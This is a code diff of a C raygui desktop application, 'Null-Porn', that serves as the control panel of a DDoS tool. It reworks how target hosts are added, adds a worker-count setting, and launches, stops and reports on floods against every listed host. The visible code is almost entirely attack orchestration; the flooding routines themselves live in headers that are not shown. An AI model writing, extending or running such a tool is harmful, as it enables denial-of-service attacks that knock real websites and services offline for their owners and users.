@@ -4,32 +4,14 @@
 #include <raygui.h>
 
 #include <stb_ds.h>
-#include <DDoS.h>
+#include <NullPorn.h>
 
 #include <pthread.h>
 #include <regex.h>
+#include <ctype.h>
 
 #define WINDOW_WIDTH  1720
 #define WINDOW_HEIGHT 967
-
-static char** GlobalIPs  = NULL;
-static char** GlobalURLs = NULL;
-
-void* FloodThread(void* arg)
-{
-    char* ipAddress = (char*)arg;
-    Flood(ipAddress);
-    return NULL;
-}
-
-void* DNSLookupThread(void* arg)
-{
-    char* url = (char*)arg;
-    char* ipAddress = DNSLookup(url);
-    if (ipAddress != NULL) 
-        Flood(ipAddress);
-    return NULL;
-}
 
 static bool ValidURL(const char* url)
 {
@@ -46,6 +28,14 @@ static bool ValidURL(const char* url)
     return !ret;
 }
 
+static bool ValidNumber(const char *text)
+{
+    for (size_t i = 0; i < strlen(text); i++)
+        if (!isdigit(text[i]))
+            return false;
+    return true;
+}
+
 int main()
 {
     InitWindow(WINDOW_WIDTH, WINDOW_HEIGHT, "Null-Porn");
@@ -55,15 +45,18 @@ int main()
     Rectangle panelContentRect = { 0, 0, panelRect.width-15, 0 };
     Vector2   panelScroll      = { 99, 0 };
 
-    bool finishedAttack = false;
+    bool showEndAttack = true;
     bool showAttack = false;
-
     bool showError = false;
-    bool showAddIP  = false;
-    bool showAddURL = false;
+    bool showAdd  = false;
+
+    char** urls = NULL;
+    uint32_t workersCount = 0;
 
     char urlBuffer[0x800] = {0};
-    char ipBuffer[0x800] = {0};
+    char workerCountBuffer[0x800] = "100";
+    bool workerBufferType = false;
+
     char* errorType;
 
     while (!WindowShouldClose())
@@ -71,86 +64,52 @@ int main()
         BeginDrawing();
         ClearBackground(RAYWHITE);
 
-        int numEntries = arrlen(GlobalIPs)+arrlen(GlobalURLs);
-        panelContentRect.height = numEntries*1.2*30+100;
+        panelContentRect.height = arrlen(urls)*1.2*30+100;
 
-        if (!showAddIP && !showAddURL && !showError && !showAttack)
+        if (!showAdd && !showError && !showAttack)
         {
             Rectangle content = GuiScrollPanel(panelRect, NULL, panelContentRect, &panelScroll);
             BeginScissorMode(content.x, content.y, content.width, content.height);
-            int baseY = panelScroll.y+panelRect.y+15;
+
             GuiSetStyle(DEFAULT, TEXT_SIZE, 21);
             GuiSetStyle(LABEL, TEXT_ALIGNMENT, TEXT_ALIGN_LEFT);
-            for (int i = 0; i < arrlen(GlobalIPs); i++)
-            {
-                int lineY = baseY + i*35;
-                GuiLabel((Rectangle) { panelRect.x + 15, lineY, content.width - 100, 30 }, GlobalIPs[i]);
-                if(GuiButton((Rectangle) { panelRect.width-75-WINDOW_HEIGHT/12, lineY, WINDOW_WIDTH/12, 30}, GuiIconText(ICON_BIN, "Remove")))
-                {
-                    arrdel(GlobalIPs, i);
-                    goto DoneButtons;
-                }
-            }
-            for (int i = 0; i < arrlen(GlobalURLs); i++)
-            {
-                int lineY = baseY + arrlen(GlobalIPs)*35 + i*35;
-                GuiLabel((Rectangle) { panelRect.x + 15, lineY, content.width - 100, 30 }, GlobalURLs[i]);
-                if(GuiButton((Rectangle) { panelRect.width-75-WINDOW_HEIGHT/12, lineY, WINDOW_WIDTH/12, 30}, GuiIconText(ICON_BIN, "Remove")))
-                {
-                    arrdel(GlobalURLs, i);
-                    goto DoneButtons;
-                }
-            }
 
+            for (int i = 0; i < arrlen(urls); i++)
+            {
+                GuiLabel((Rectangle) { panelRect.x + 15, panelScroll.y+panelRect.y+15 + i*35, content.width - 100, 30 }, urls[i]);
+                if(GuiButton((Rectangle) { panelRect.width-75-WINDOW_HEIGHT/12, panelScroll.y+panelRect.y+15 + i*35, WINDOW_WIDTH/12, 30}, GuiIconText(ICON_BIN, "Remove")))
+                {
+                    arrdel(urls, i);
+                    goto DoneButtons;
+                }
+            }
             DoneButtons: EndScissorMode();
             
             GuiSetStyle(DEFAULT, TEXT_SIZE, 28);
             GuiSetStyle(BUTTON, TEXT_ALIGNMENT, TEXT_ALIGN_CENTER);
 
-            if (GuiButton((Rectangle) { 25, 25, WINDOW_WIDTH/12, WINDOW_HEIGHT/12 }, "ADD IP"))
-                showAddIP = true;
-            if (GuiButton((Rectangle) { 50+WINDOW_WIDTH/12, 25, WINDOW_WIDTH/12, WINDOW_HEIGHT/12 }, "ADD URL"))
-                showAddURL = true;
-
-            if (GuiButton((Rectangle) { WINDOW_WIDTH-25-WINDOW_WIDTH/12, 25, WINDOW_WIDTH/12, WINDOW_HEIGHT/12 }, "ATTACK"))
-                showAttack = true;
-        }
-
-        if (showAddIP)
-        {
-            GuiSetStyle(DEFAULT, TEXT_SIZE, 80);
-            GuiSetStyle(LABEL, TEXT_ALIGNMENT, TEXT_ALIGN_CENTER);
-            GuiLabel((Rectangle) { WINDOW_WIDTH/4, WINDOW_HEIGHT/2-100, WINDOW_WIDTH/2, 80 }, "ADD IP");
-            GuiSetStyle(DEFAULT, TEXT_SIZE, 48);
-            GuiTextBox((Rectangle) { WINDOW_WIDTH/4, WINDOW_HEIGHT/2+100, WINDOW_WIDTH/2, 50 }, ipBuffer, 0x800, true);
-
-            GuiSetStyle(DEFAULT, TEXT_SIZE, 28);
-            if (GuiButton((Rectangle) { WINDOW_WIDTH/4, WINDOW_HEIGHT/2+200, WINDOW_WIDTH/4-50, 40 }, "Cancel"))
-            {
-                memset(ipBuffer, 0, 0x800);
-                showAddIP = false;
-            }
-
-            if (GuiButton((Rectangle) { WINDOW_WIDTH/2+50, WINDOW_HEIGHT/2+200, WINDOW_WIDTH/4-50, 40 }, "Okay"))
-            {
-                if (ValidIP(ipBuffer))
-                    arrput(GlobalIPs, strdup(ipBuffer));
-                else 
+            if (GuiTextBox((Rectangle) { 100+WINDOW_HEIGHT/12, 25, WINDOW_HEIGHT/12, WINDOW_HEIGHT/12 }, workerCountBuffer, 0x800, workerBufferType))
+                if (ValidNumber(workerCountBuffer))
                 {
-                    errorType = "Invalid IP";
-                    showError = true;
+                    workersCount = atoi(workerCountBuffer);
+                    workerBufferType = !workerBufferType;
                 }
 
-                memset(ipBuffer, 0, 0x800);
-                showAddIP = false;
+            if (GuiButton((Rectangle) { 25, 25, WINDOW_WIDTH/12, WINDOW_HEIGHT/12 }, "ADD HOST"))
+                showAdd = true;
+            if (GuiButton((Rectangle) { WINDOW_WIDTH-25-WINDOW_WIDTH/12, 25, WINDOW_WIDTH/12, WINDOW_HEIGHT/12 }, "ATTACK"))
+            {
+                showAttack = true;
+                showEndAttack = true;
             }
         }
 
-        if (showAddURL)
+        if (showAdd)
         {
+
             GuiSetStyle(DEFAULT, TEXT_SIZE, 80);
             GuiSetStyle(LABEL, TEXT_ALIGNMENT, TEXT_ALIGN_CENTER);
-            GuiLabel((Rectangle) { WINDOW_WIDTH/4, WINDOW_HEIGHT/2-100, WINDOW_WIDTH/2, 80 }, "ADD URL");
+            GuiLabel((Rectangle) { WINDOW_WIDTH/4, WINDOW_HEIGHT/2-100, WINDOW_WIDTH/2, 80 }, "ADD HOST");
             GuiSetStyle(DEFAULT, TEXT_SIZE, 48);
             GuiTextBox((Rectangle) { WINDOW_WIDTH/4, WINDOW_HEIGHT/2+100, WINDOW_WIDTH/2, 50 }, urlBuffer, 0x800, true);
 
@@ -158,21 +117,21 @@ int main()
             if (GuiButton((Rectangle) { WINDOW_WIDTH/4, WINDOW_HEIGHT/2+200, WINDOW_WIDTH/4-50, 40 }, "Cancel"))
             {
                 memset(urlBuffer, 0, 0x800);
-                showAddURL = false;
+                showAdd = false;
             }
 
             if (GuiButton((Rectangle) { WINDOW_WIDTH/2+50, WINDOW_HEIGHT/2+200, WINDOW_WIDTH/4-50, 40 }, "Okay"))
             {
                 if (ValidURL(urlBuffer))
-                    arrput(GlobalURLs, strdup(urlBuffer));
-                else
+                    arrput(urls, strdup(urlBuffer));
+                else 
                 {
-                    errorType = "Invalid URL";
+                    errorType = "Invalid HOST";
                     showError = true;
                 }
 
                 memset(urlBuffer, 0, 0x800);
-                showAddURL = false;
+                showAdd = false;
             }
         }
 
@@ -191,37 +150,60 @@ int main()
 
         if (showAttack)
         {
-            if (!finishedAttack)
+            DDoS attacks[arrlen(urls)];
+
+            for (int i = 0; i < arrlen(urls); i++)
             {
-                pthread_t ipThreads[arrlen(GlobalIPs)];
-                pthread_t urlThreads[arrlen(GlobalURLs)];
-
-                for (int i = 0; i < arrlen(GlobalIPs); i++)
-                    pthread_create(&ipThreads[i], NULL, FloodThread, GlobalIPs[i]);
-                for (int i = 0; i < arrlen(GlobalURLs); i++)
-                    pthread_create(&urlThreads[i], NULL, DNSLookupThread, GlobalURLs[i]);
-
-                finishedAttack = true;
+                CreateAttack(&attacks[i], urls[i], workersCount);
+                RunAttack(&attacks[i]);
             }
 
-            if (GuiButton((Rectangle) { (WINDOW_WIDTH-WINDOW_WIDTH/4+50)/2, WINDOW_HEIGHT/2+200, WINDOW_WIDTH/4-50, 40 }, "Stop"))
+            if (showEndAttack)
             {
-                StopFlood();
+                GuiSetStyle(DEFAULT, TEXT_SIZE, 80);
+                GuiSetStyle(LABEL, TEXT_ALIGNMENT, TEXT_ALIGN_CENTER);
+                GuiLabel((Rectangle) { WINDOW_WIDTH/4, WINDOW_HEIGHT/2-100, WINDOW_WIDTH/2, 80 }, "ATTACK STARTED");
+                GuiSetStyle(DEFAULT, TEXT_SIZE, 48);
+                GuiLabel((Rectangle) { WINDOW_WIDTH/4, WINDOW_HEIGHT/2+100, WINDOW_WIDTH/2, 50 }, "Press stop to end the attack.");
+
+                GuiSetStyle(DEFAULT, TEXT_SIZE, 28);
+                if(GuiButton((Rectangle) { (WINDOW_WIDTH-WINDOW_WIDTH/4+50)/2, WINDOW_HEIGHT/2+200, WINDOW_WIDTH/4-50, 40 }, "Stop"))
+                {
+                    for (int i = 0; i < arrlen(urls); i++)
+                        StopAttack(&attacks[i]);
+                    showEndAttack = false;
+                }
+            } else 
+            {
+                char totalBuffer[256];
+                char successfulBuffer[256];
+
+                int successfulRequests = 0;
+                int totalRequests = 0;
                 
-                showAttack = false;
-                finishedAttack = false;
+                for (int i = 0; i < arrlen(urls); i++)
+                {
+                    successfulRequests += attacks[i].data->successfulRequests;
+                    totalRequests += attacks[i].data->totalRequests;
+                }
+                
+                snprintf(totalBuffer, sizeof(totalBuffer), "Total Requests: %d", totalRequests);
+                snprintf(successfulBuffer, sizeof(successfulBuffer), "Successful Requests: %d", successfulRequests);
+
+                GuiSetStyle(DEFAULT, TEXT_SIZE, 48);
+                GuiSetStyle(LABEL, TEXT_ALIGNMENT, TEXT_ALIGN_CENTER);
+                GuiLabel((Rectangle) { WINDOW_WIDTH/4, WINDOW_HEIGHT/2-100, WINDOW_WIDTH/2, 80 }, totalBuffer);
+                GuiLabel((Rectangle) { WINDOW_WIDTH/4, WINDOW_HEIGHT/2+100, WINDOW_WIDTH/2, 50 }, successfulBuffer);
+
+                GuiSetStyle(DEFAULT, TEXT_SIZE, 28);
+                if(GuiButton((Rectangle) { (WINDOW_WIDTH-WINDOW_WIDTH/4+50)/2, WINDOW_HEIGHT/2+200, WINDOW_WIDTH/4-50, 40 }, "Close"))
+                    showAttack = false;
             }
         }
         
         EndDrawing();
     }
     
+    arrfree(urls);
     CloseWindow();
-
-    arrfree(GlobalURLs);
-    arrfree(GlobalIPs);
-
-    return 0;
 }
-
-
